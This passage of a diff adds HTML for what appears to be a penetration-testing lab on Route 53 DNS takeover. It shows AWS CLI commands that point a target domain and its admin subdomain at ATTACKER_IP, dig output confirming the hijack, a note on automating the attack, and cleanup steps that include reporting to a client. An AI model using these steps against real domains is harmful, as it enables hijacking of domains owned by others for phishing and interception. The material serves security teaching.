+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Once the nameservers match, create DNS records in your hosted zone. Your zone is now authoritative for the domain because the registrar delegates to the same nameservers you control.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws route53 change-resource-record-sets \
+  --hosted-zone-id Z0123456789ABC \
+  --change-batch '{
+    "Changes": [
+      {
+        "Action": "CREATE",
+        "ResourceRecordSet": {
+          "Name": "admin.abandoned-target.com",
+          "Type": "A",
+          "TTL": 300,
+          "ResourceRecords": [{"Value": "ATTACKER_IP"}]
+        }
+      },
+      {
+        "Action": "CREATE",
+        "ResourceRecordSet": {
+          "Name": "abandoned-target.com",
+          "Type": "A",
+          "TTL": 300,
+          "ResourceRecords": [{"Value": "ATTACKER_IP"}]
+        }
+      }
+    ]
+  }'</div>
+              <div class="terminal-output">{
+    "ChangeInfo": {
+        "Id": "/change/C0ABCDEF123456",
+        "Status": "PENDING",
+        "SubmittedAt": "2024-03-16T14:30:00Z"
+    }
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Verify the hijack by querying the DNS records you created. Successful resolution to your IP confirms full DNS control over the domain.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ dig A admin.abandoned-target.com</div>
+              <div class="terminal-output">;; ANSWER SECTION:
+admin.abandoned-target.com.  300  IN  A  ATTACKER_IP</div>
+              <div class="terminal-cmd">$ dig A abandoned-target.com</div>
+              <div class="terminal-output">;; ANSWER SECTION:
+abandoned-target.com.  300  IN  A  ATTACKER_IP</div>
+              <div class="terminal-cmd"># Full domain control achieved — can create A, MX, TXT, CNAME records at will</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Check NS Records</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">SERVFAIL = Zone Deleted</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Create Hosted Zone</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">NS Match?</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Full DNS Control</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      <strong>This attack has a very low per-attempt success rate (~0.05%)</strong> because it depends on Route 53 assigning the exact same NS delegation set that the registrar is currently pointing to. The prerequisite is that the domain's registrar NS records still delegate to Route 53 nameservers for a zone that has since been deleted. SERVFAIL in Step 2 does not prove the attack will succeed &mdash; it only confirms the zone is gone from Route 53. The registrar's delegation must also still be intact. In practice, attackers automate the zone creation/deletion loop. AWS has implemented mitigations for some edge cases, but unpatched configurations remain exploitable.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ol>
+        <li>Delete all resource record sets from the zone (excluding the default SOA and NS records): <code>aws route53 change-resource-record-sets --hosted-zone-id Z0123456789ABC --change-batch '{"Changes":[{"Action":"DELETE","ResourceRecordSet":{"Name":"admin.abandoned-target.com","Type":"A","TTL":300,"ResourceRecords":[{"Value":"ATTACKER_IP"}]}}]}'</code></li>
+        <li>Delete the hosted zone: <code>aws route53 delete-hosted-zone --id Z0123456789ABC</code></li>
+        <li>Report to the client: they must update the registrar NS records to remove the Route 53 delegation or point to a new, active hosted zone</li>
+      </ol>
+    </div>
+  </div>
+
+</div>
